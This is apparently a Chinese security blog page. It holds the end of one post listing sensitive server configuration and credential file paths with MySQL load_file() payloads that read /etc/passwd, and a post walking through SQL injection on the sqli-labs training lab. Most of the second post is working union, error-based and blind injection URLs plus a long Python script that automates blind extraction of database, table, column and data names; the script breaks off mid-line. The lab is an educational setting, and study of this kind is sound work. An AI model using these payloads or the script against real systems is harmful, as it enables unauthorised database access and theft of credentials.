<p>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件</p>
<p>c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.</p>
<p>c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机</p>
<p>d:\APACHE\Apache2\conf\httpd.conf</p>
<p>C:\Program Files\mysql\my.ini</p>
<p>C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</p>
<p>LUNIX/UNIX 下:<br>/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</p>
<p>/usr/local/apache2/conf/httpd.conf</p>
<p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p>
<p>/usr/local/app/php5/lib/php.ini //PHP相关设置</p>
<p>/etc/sysconfig/iptables //从中得到防火墙规则策略</p>
<p>/etc/httpd/conf/httpd.conf // apache配置文件</p>
<p>/etc/rsyncd.conf //同步程序配置文件</p>
<p>/etc/my.cnf //mysql的配置文件</p>
<p>/etc/redhat-release //系统版本</p>
<p>/etc/issue</p>
<p>/etc/issue.net</p>
<p>/usr/local/app/php5/lib/php.ini //PHP相关设置</p>
<p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p>
<p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</p>
<p>/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
<p>/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</p>
<p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</p>
<p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件</p>
<p>/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p>
<p>/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</p>
<p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</p>
<p>/etc/sysconfig/iptables 查看防火墙策略</p>
<p>load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录</p>
<p>replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</p>
<p>replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p>

          
        
      
    </div>

    

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/28/巩固sql注入/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="cookie">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="The clown is laughing at you">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/28/巩固sql注入/" class="post-title-link" itemprop="url">巩固sql注入</a>
              
            
          </h1>
        

        <div class="post-meta">

          
          
          

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2019-01-28 15:11:52" itemprop="dateCreated datePublished" datetime="2019-01-28T15:11:52+08:00">2019-01-28</time>
            </span>
          

          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Bearbeitet am</span>
                
                <time title="Geändert am: 2019-03-17 11:31:20" itemprop="dateModified" datetime="2019-03-17T11:31:20+08:00">2019-03-17</time>
              </span>
            
          

          

          
            
            
          

          
          

          

          

          <br>
          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><strong>0x01 认证绕过</strong><br>sqlilab 1<br>整个注入的流程：<br>数据库名–&gt;数据表名–&gt;字段名–&gt;数据名</p>
<p>此次的实验平台是sqlilab的第一题，我个人觉得第一题虽然最为简单，但是却最为重要，毕竟万事开头难嘛。<br>这里补充一些关于mysql的知识点：<br>mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息，下面说一下常用的几个表</p>
<p><strong>SCHEMATA表：储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。</strong></p>
<p><strong>TABLES表：储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表</strong></p>
<p><strong>COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">information_schema.tables存储了数据表的元数据信息，下面对常用的字段进行介绍：</span><br><span class="line">table_schema: 记录数据库名；</span><br><span class="line">table_name: 记录数据表名；</span><br><span class="line">engine : 存储引擎；</span><br><span class="line">table_rows: 关于表的粗略行估计；</span><br><span class="line">data_length : 记录表的大小（单位字节）；</span><br><span class="line">index_length : 记录表的索引的大小；</span><br><span class="line">row_format: 可以查看数据表是否压缩过；</span><br></pre></td></tr></table></figure>
<p>我们先爆出数据所在的数据表的列数<br>    <code>http://localhost/sqlilab/Less-1/?id=1&#39; order by  4 --+</code><br><img src="/2019/01/28/巩固sql注入/1.png" alt="1"></p>
<p>发现错误，那么我们试试<br>    <code>http://localhost/sqlilab/Less-1/?id=1&#39; order by  3 --+</code><br><img src="/2019/01/28/巩固sql注入/2.png" alt="1"></p>
<p>说明有三列，那么接下来我们爆出它的数据库名，这道题是比较简单的认证绕过，因为源码中没有任何过滤所以就可以为所欲为。<br>爆它的数据库名：<br>   <code>http://localhost/sqlilab/Less-1/?id=-1&#39; union select 1,database(),version()--+</code><br><img src="/2019/01/28/巩固sql注入/3.png" alt="1"></p>
<p>数据库名已出，那么接下来爆出它的表名<br>   <code>http://localhost/sqlilab/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from  information_schema.tables where table_schema=&#39;security&#39;--+</code><br><img src="/2019/01/28/巩固sql注入/4.png" alt="1"></p>
<p>数据表名已出，接下来爆出它的字段名（我们这里爆email的字段名）<br>    <code>http://localhost/sqlilab/Less-1/?id=-1%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27emails%27--+</code><br><img src="/2019/01/28/巩固sql注入/5.png" alt="1"></p>
<p><strong>之前爆不出数据表users的字段名：这下我发现正确的爆库payload是：</strong><br>    <code>http://localhost/sqlilab/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from  information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;--+</code></p>
<p>爆数据<br>    <code>http://localhost/sqlilab/Less-1/?id=-1&#39; union select id,email_id,3 from emails where id=1 --+</code><br><img src="/2019/01/28/巩固sql注入/6.png" alt="1"></p>
<p>这就出来了，实际上这里有些东西是可以通过脚本来进行自动化注入。<br>（剩下的2,3,4题观察其源码就知道稍微修改就好）</p>
<p><strong>0x02</strong><br>sqlilab 5<br>这道题有两个解法，一个是通过双注入，一个是通过盲注脚本<br>先讲第一个解法，通过双注入来完成注入，这里要补充一下mysql的一些知识：</p>
<p>先来一个很简单的例子：<br>select concat(select database());<br>这就是一个简单的双查询的过程，简单理解的情况下就是查询该数据库，通过concat()函数，concat()这个函数用于连接前后两个字符串，比如concat(‘a’,’b’)，结果就是ab.</p>
<p>学习几个常见双注入需要的函数/语法：</p>
<ol>
<li>Rand() //随机函数 </li>
<li>Floor() //取整函数</li>
<li>Count() //汇总函数</li>
<li>Group by clause //分组语句</li>
</ol>
<p>代码一：<br><img src="/2019/01/28/巩固sql注入/7.png" alt="1"></p>
<p>代码二：<br><img src="/2019/01/28/巩固sql注入/8.png" alt="1"></p>
<p>代码三：<br><img src="/2019/01/28/巩固sql注入/9.png" alt="1"></p>
<p>代码四：（在上面的代码加入from将会返回一个集合）<br><img src="/2019/01/28/巩固sql注入/10.png" alt="1"></p>
<p>代码五：（加入group by,使得相同的值被分到同一个分组）<br><img src="/2019/01/28/巩固sql注入/11.png" alt="1"></p>
<p>代码六：最后一步，在concat前加入聚合函数 count(*)<br><img src="/2019/01/28/巩固sql注入/12.png" alt="1"></p>
<p>现在我们来了解这道题，首先爆出列数，按照最简单的payload来<br>    <code>http://localhost/sqlilab/Less-5/?id=-1&#39; union select count(*),concat(&#39;*&#39;,(select database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a --+</code><br><img src="/2019/01/28/巩固sql注入/13.png" alt="1"><br>发现出现问题了，所以现在我们就可以去试出它的列数为3，<br>所以正确的payload为：<br>    <code>http://localhost/sqlilab/Less-5/?id=-1&#39; union select count(*),2，concat(&#39;*&#39;,(select, database()),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a --+</code><br>我们可以爆出它的数据库名为：<br><img src="/2019/01/28/巩固sql注入/14.png" alt="1"></p>
<p>爆出其数据表名：<br>    <code>http://localhost/sqlilab/Less-5/?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a --+</code><br><img src="/2019/01/28/巩固sql注入/15.png" alt="1"></p>
<p>爆出其字段名：<br>    <code>http://localhost/sqlilab/Less-5/?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),&#39;*&#39;,floor(rand(0)*2))as a from information_schema.tables group by a --+</code></p>
<p>接下来就按照常规的操作来获取其数据值：(可写脚本通过自动化注入)<br>    <code>?id=-1&#39; union select count(*),2,concat(&#39;*&#39;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#39;*&#39;,floor(rand()*2))as a from information_schema.tables group by a --+</code></p>
<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a><strong>0x03</strong></h2><p>sqlilab 5（盲注）<br>这道题，这次使用盲注，我们通过认证绕过的payload会发现，如果注入成功，将会返回“You are in………”<br>关于布尔盲注的知识稍后再进行补充<br>放上脚本，我是把整个过程拆块儿进行：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x01</span></span><br><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名的长度</span></span><br><span class="line"><span class="comment">#获取链接</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"--------------------------------------------------------"</span>)</span><br><span class="line">print(<span class="string">"开始获取数据库长度......"</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range (<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(length(database())=%d)--+"</span>%x</span><br><span class="line"><span class="comment"># 获取页面内容</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    demo = r.text</span><br><span class="line">    </span><br><span class="line"><span class="comment">#使用正则表达式判断demo中是否有与 "you are in ......" 相匹配的内容</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      ans = re.compile(<span class="string">"You are in"</span>).search(demo)<span class="comment">#检测是否匹配到相关信息</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="keyword">print</span> <span class="string">'fail to match'</span>  </span><br><span class="line">    <span class="keyword">if</span> ans == <span class="keyword">None</span>:<span class="comment">#判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'waiting for a moment........'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'the length of database is  %d'</span>%x</span><br><span class="line">        db_length = x</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"获取数据库长度成功"</span></span><br><span class="line">        print(<span class="string">"--------------------------------------------------------"</span>)</span><br><span class="line">        <span class="keyword">break</span>       </span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名称</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"开始获取数据库名......"</span></span><br><span class="line"><span class="comment">#获取链接</span></span><br><span class="line">list = []</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> string.lowercase:</span><br><span class="line">    list.append(word)</span><br><span class="line">db_list=[]<span class="comment">#该列表用于存储获取到的数据库的字符</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,db_length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> list:</span><br><span class="line">      url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(substr(database(),%d,1)='%%s')--+"</span>%x %y<span class="comment">#这里注意使用%%s转义</span></span><br><span class="line"><span class="comment">#获取页面内容</span></span><br><span class="line">      r = requests.get(url)</span><br><span class="line">      r.encoding = r.apparent_encoding</span><br><span class="line">      demo = r.text</span><br><span class="line"><span class="comment">#对获取到的页面信息进行正则表达式匹配</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">          ans = re.compile(<span class="string">"You are in"</span>).search(demo)  <span class="comment"># 检测是否匹配到相关信息</span></span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">          <span class="keyword">print</span> <span class="string">'fail to match'</span></span><br><span class="line">      <span class="keyword">if</span> ans != <span class="keyword">None</span>:  <span class="comment"># 判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">          <span class="keyword">print</span> <span class="string">'the true letter of database is %s'</span> % y</span><br><span class="line">          <span class="keyword">print</span> <span class="string">'获取第%d个字母成功'</span> % x</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    db_list.append(y)</span><br><span class="line">db_name = <span class="string">""</span>.join(db_list)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"the name of database is  "</span>+ db_name</span><br><span class="line"><span class="keyword">print</span> <span class="string">"获取数据库名成功"</span></span><br><span class="line">print(<span class="string">"--------------------------------------------------------"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取该数据库中的数据表数目</span></span><br><span class="line"><span class="comment">#获取链接</span></span><br><span class="line">db_name = <span class="string">'security'</span></span><br><span class="line">print(<span class="string">"开始获取该数据库中的数据表数目......"</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="comment">#这里又一个转义的问题需要关注</span></span><br><span class="line">    url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(( SELECT count(*)  FROM information_schema.tables WHERE TABLE_SCHEMA = '%s')='%d')--+"</span>%(db_name , x)</span><br><span class="line">    <span class="comment"># 获取页面内容</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    demo = r.text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用正则表达式判断demo中是否有与 "you are in ......" 相匹配的内容</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ans = re.compile(<span class="string">"You are in"</span>).search(demo)  <span class="comment"># 检测是否匹配到相关信息</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'fail to match'</span></span><br><span class="line">    <span class="keyword">if</span> ans != <span class="keyword">None</span>:  <span class="comment"># 判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'the number of tables is  %d'</span> % x</span><br><span class="line">        table_count = x</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"获取数据库表数目成功"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'数据库表的数目不是%d'</span>%x     </span><br><span class="line"><span class="keyword">print</span> <span class="string">'获取数据库表数目成功,数目为%d'</span>%table_count        </span><br><span class="line"></span><br><span class="line">list = []</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> string.lowercase:</span><br><span class="line">    list.append(word)</span><br><span class="line"><span class="comment">#获取数据库表,各个数据表名的长度以及数据表名</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,table_count):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'开始获取第%d个表的长度.....'</span>%x</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(ascii(substr((SELECT table_name FROM information_schema.tables WHERE TABLE_SCHEMA = '%s' limit %d,1),%d,1)))--+"</span>%(db_name,x,y)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        demo = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:  <span class="comment"># 判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">            _table_length = y<span class="number">-1</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'获取到此表的长度为:%d'</span>%_table_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'开始获取该表的表名'</span></span><br><span class="line">    table_name=[]</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>,_table_length+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> list:</span><br><span class="line">            url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(substr((SELECT table_name FROM information_schema.tables where table_schema = '%s' limit %d,1),%d,1) = '%s')--+"</span>%(db_name,x,y,z)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            demo = r.text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">               table_name.append(z)</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">    tb_name = <span class="string">""</span>.join(table_name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'该表的名字为:'</span>+tb_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0x02</span></span><br><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">table_name = <span class="string">'users'</span></span><br><span class="line"><span class="comment">#获取该表中的列数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id= 1'and ((select count(column_name) from information_schema.columns where table_name = '%s')=%d) --+"</span> % (table_name, i)</span><br><span class="line">    <span class="comment"># 获取页面内容</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:  <span class="comment"># 判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'the number of columns is  %d'</span> % i</span><br><span class="line">        column_count = i</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"获取数据表列数目成功"</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'获取%s表列数目成功,数目为%d'</span> % (table_name, column_count)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取列的长度</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">list = []</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> string.lowercase:</span><br><span class="line">    list.append(word)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,column_count):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'开始获取第%d个列的长度.....'</span>%x</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_name = '%s' limit %d,1),%d,1)))--+"</span>%(table_name,x,y)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        demo = r.text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:  <span class="comment"># 判断ans("You are in.......")是否在该页面中</span></span><br><span class="line">            _column_length = y<span class="number">-1</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'获取到此列的长度为:%d'</span>%_column_length</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库表中各列的名称</span></span><br><span class="line">    column_name=[]</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0</span>, _column_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> z <span class="keyword">in</span> list:</span><br><span class="line">            url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(substr((SELECT column_name FROM information_schema.columns where table_name = '%s' limit %d,1),%d,1) = '%s')--+"</span> % (table_name, x, y, z)</span><br><span class="line">            r = requests.get(url)</span><br><span class="line">            r.encoding = r.apparent_encoding</span><br><span class="line">            demo = r.text</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                column_name.append(z)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    co_name = <span class="string">""</span>.join(column_name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'该列的名字为:'</span> + co_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0x03</span></span><br><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">database_name = <span class="string">'security'</span></span><br><span class="line">table_name = <span class="string">'users'</span></span><br><span class="line">column_name = <span class="string">'username'</span></span><br><span class="line"><span class="comment">#获取该列的字段数目</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id= 1'and ((select count(%s) from %s.%s)=%d) --+"</span> % (column_name,database_name,table_name,i)</span><br><span class="line">    <span class="comment"># 获取页面内容</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    r.encoding = r.apparent_encoding</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> r.text:  <span class="comment">#</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'the number of 该字段 is  %d'</span> % i</span><br><span class="line">        all_column_count = i</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"获取字段总数目成功,数目是:%d"</span>%all_column_count</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取字段的长度</span></span><br><span class="line">list = []</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> string.lowercase:</span><br><span class="line">    list.append(word)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>,all_column_count):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'开始获取第%d个字段的长度.....'</span>%x</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">        url = <span class="string">"http://127.0.0.1/sqlilabs/Less-5/?id=1'and(ascii(substr((SELECT %s FROM %s.%s limit 